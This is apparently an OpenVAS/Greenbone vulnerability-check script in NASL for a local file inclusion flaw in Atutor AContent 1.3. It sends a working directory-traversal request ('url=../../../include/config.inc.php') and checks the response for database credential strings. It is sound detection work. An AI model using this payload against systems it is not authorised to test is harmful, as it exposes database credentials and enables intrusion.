if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803346" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "6.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-03-26 15:10:47 +0530 (Tue, 26 Mar 2013)" );
	script_name( "Atutor AContent Local File Inclusion Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/83018" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/24869" );
	script_xref( name: "URL", value: "http://exploitsdownload.com/exploit/na/acontent-13-local-file-inclusion" );
	script_tag( name: "impact", value: "Successful exploitation could allow attackers to perform
  directory traversal attacks and read arbitrary files on the affected application." );
	script_tag( name: "affected", value: "Atutor AContent version 1.3." );
	script_tag( name: "insight", value: "The flaw is due to an input validation error in 'url' parameter
  to '/oauth/lti/common/tool_provider_outcome.php' script." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is installed with Atutor AContent and is prone to
  local file inclusion vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/AContent", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = dir + "/home/index.php";
	res = http_get_cache( item: url, port: port );
	if(res && ContainsString( res, ">AContent</" )){
		url = dir + "/oauth/lti/common/tool_provider_outcome.php?grade=1&key=1&" + "secret=secret&sourcedid=1&submit=Send%20Grade&url=../../../" + "include/config.inc.php";
		if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "AContent", extra_check: make_list( "DB_USER",
			 "DB_PASSWORD" ) )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 99 );

